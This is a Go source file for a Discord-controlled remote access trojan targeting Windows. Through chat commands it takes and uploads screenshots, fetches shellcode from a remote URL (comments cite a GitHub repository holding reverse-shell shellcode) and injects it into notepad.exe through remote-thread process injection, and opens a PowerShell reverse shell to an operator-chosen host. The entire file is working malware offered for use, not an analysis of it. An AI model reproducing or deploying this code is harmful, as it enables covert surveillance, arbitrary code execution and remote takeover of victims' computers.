package main

import (
	"os"
	"net"
	"fmt"
	"time"
	"strings"
	"strconv"
	"syscall"
	"unsafe"
	"net/http"
	"io/ioutil"
	"os/exec"
	"os/signal"
	"image/png"
	"encoding/json"

	"golang.org/x/sys/windows"
	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"

	"github.com/mitchellh/go-ps"
	
)

type shellcode struct {
	Shellcode []byte `json:"Shellcode"`
}


var DISCORD_TOKEN string = "YOUR_DISCORD_TOKEN_HERE"

var RSHELL_HOST string
var RSHELL_PORT int

//https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/calculator.json
//https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/reverse_shell.json


func getShellcode(url string) []byte {

	shellcodeClient := http.Client{
		Timeout: time.Second * 2,
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")

	res, getErr := shellcodeClient.Do(req)
	if getErr != nil {
		fmt.Println("Error while retrieving shellcode")
		fmt.Println(err)
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, readErr := ioutil.ReadAll(res.Body)
	if readErr != nil {
		fmt.Println("Error while reading bytes")
		fmt.Println(err)
	}
	
	sc1 := shellcode{}
	jsonErr := json.Unmarshal(body, &sc1)
	if jsonErr != nil {
		fmt.Println("Error while unmarshalling the json")
		fmt.Println(err)
	}

	shellcodeBytes := sc1.Shellcode
	return shellcodeBytes
}

func takeSnapshot() string {
	
	i := 0
	bounds := screenshot.GetDisplayBounds(i)
	img, err := screenshot.CaptureRect(bounds)
 	if err != nil {
 		panic(err)
 	}
	fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
 	file, _ := os.Create(fileName)
 	defer file.Close()
 	png.Encode(file, img)
	//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	return fileName
}

func removeFile(fileName string) {
	time.Sleep(15 * time.Second)
	err := os.Remove(fileName)
	if err != nil {
		fmt.Println("Unable to remove the file: " + fileName)
		fmt.Println(err)
	}
}

func process_injection(sc []byte, process_name string) {
	pid := find_process(process_name)
	// fmt.Println("Attempting injection into " + process_name)
	if pid == 0 {
		panic("Cannot find " + process_name + " process")
	}

	kernel32 := windows.NewLazyDLL("kernel32.dll") //Loads kernel32.dll
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	// Check this line
	proc, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		panic(fmt.Sprintf("[!] OpenProcess(): %s", err.Error()))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil  && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] VirtualAllocEx(): %s", errVirtualAlloc.Error()))
	}

	_,_, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] WriteProcessMemory(): %s", errWriteProcessMemory.Error()))
	}
	
	op := 0
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&op)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] VirtualProtectEx(): %s", errVirtualProtectEx.Error()))
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateRemoteThreadEx(): %s", errCreateRemoteThreadEx.Error()))
	}

	errCloseHandle := windows.CloseHandle(proc)
	if errCloseHandle != nil {
		panic(fmt.Sprintf("[!] CloseHandle(): %s", errCloseHandle.Error()))
	}
}

func find_process(proc string) int {
	processList, err := ps.Processes()
	if err != nil {
		return -1
	}

	for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() != proc { // Does the process match the name we are looking for? If not keep going
			continue
		}
		p, errOpenProcess := windows.OpenProcess(windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
		if errOpenProcess != nil {
			continue
		}
		windows.CloseHandle(p)
		return process.Pid()
	}
	return 0
}

func sendShell(remoteHost string) {
	// Must be of this format - 127.0.0.1:4444
	conn, err := net.Dial("tcp", remoteHost)
	if err != nil {
		return
	}
	// Spawn shell for correct OS
	var cmd *exec.Cmd
	cmd = exec.Command("powershell")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore all messages to the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == "!hello" {
		s.ChannelMessageSend(m.ChannelID, "Hello!")
	}

	if m.Content == "!snapshot" {
		snapshotName := takeSnapshot()
		snapshotData, err := os.OpenFile(snapshotName, os.O_RDWR, 0644)
		if err != nil {
			fmt.Println("Unable to open the specified file ", err)
		} 
		s.ChannelFileSend(m.ChannelID, snapshotName, snapshotData)
		defer snapshotData.Close()
		go removeFile(snapshotName)
	}

	if strings.HasPrefix(m.Content, "!exec-shellcode ") {
		u := m.Content[16:]
		s.ChannelMessageSend(m.ChannelID, "Attempting to execute shellcode located at " + u)
		se := getShellcode(u)
		go process_injection(se, "notepad.exe")

	}

	if m.Content == "!reverse-shell" {
		if RSHELL_HOST == "" {
			s.ChannelMessageSend(m.ChannelID, "I cannot send the reverse shell because you have not set the remote host")
			return
		}
		if RSHELL_PORT == 0 {
			s.ChannelMessageSend(m.ChannelID, "I cannot send the reverse shell because you have not set the remote port")
			return
		}
		rhost := RSHELL_HOST + ":" + strconv.Itoa(RSHELL_PORT)
		s.ChannelMessageSend(m.ChannelID, "Attempting to open reverse shell to " + rhost)
		go sendShell(rhost)

	}

	if strings.HasPrefix(m.Content, "!set-rshell-host ") {
		RSHELL_HOST = m.Content[17:]
		s.ChannelMessageSend(m.ChannelID, "Reverse shell host has been updated")
	}

	if strings.HasPrefix(m.Content, "!set-rshell-port ") {
		pr, i_err := strconv.Atoi(m.Content[17:])
		if i_err != nil {
			s.ChannelMessageSend(m.ChannelID, "I was unable to set the port please try again")
			return
		}
		RSHELL_PORT = pr
		s.ChannelMessageSend(m.ChannelID, "Reverse shell port has been updated")
	}

	if m.Content == "!get-rshell-host" {
		s.ChannelMessageSend(m.ChannelID, RSHELL_HOST)
	}

	if m.Content == "!get-rshell-port" {
		s.ChannelMessageSend(m.ChannelID, strconv.Itoa(RSHELL_PORT))
	}

	if strings.HasPrefix(m.Content, "!echo ") {
		msg := m.Content[5:]
		s.ChannelMessageSend(m.ChannelID, msg)
	}

}

func main() {
	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + DISCORD_TOKEN)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}
	
	// Register the messageCreate function as a callback for MessageCreate events
	dg.AddHandler(messageCreate)

	// In this example we only care about receiving message events
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	// Wait here until Ctrl-C or other term signal is received
	fmt.Println("Bot is now running. Press Ctrl-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	// Cleanly close down the Discord session
	dg.Close()
}